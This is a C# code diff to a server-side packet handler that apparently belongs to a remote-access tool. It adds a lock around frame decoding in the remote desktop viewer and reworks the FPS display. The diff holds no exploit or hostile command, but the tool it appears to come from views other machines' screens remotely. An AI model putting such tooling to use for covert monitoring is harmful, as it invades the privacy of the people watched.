@@ -33,19 +33,18 @@ namespace Server.Handle_Packet
                             RD.numericUpDown2.Maximum = Screens - 1;
                         }
                         byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                        Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
+                        lock (RD.syncPicbox)
+                        {
+                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
 
-                        if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
-                        {
                             RD.pictureBox1.Image = decoded;
-                            RD.RenderSW = Stopwatch.StartNew();
-                        }
-                        RD.FPS++;
-                        if (RD.sw.ElapsedMilliseconds >= 1000)
-                        {
-                            RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
-                            RD.FPS = 0;
-                            RD.sw = Stopwatch.StartNew();
+                            RD.FPS++;
+                            if (RD.sw.ElapsedMilliseconds >= 1000)
+                            {
+                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                                RD.FPS = 0;
+                                RD.sw = Stopwatch.StartNew();
+                            }
                         }
                     }
                     else
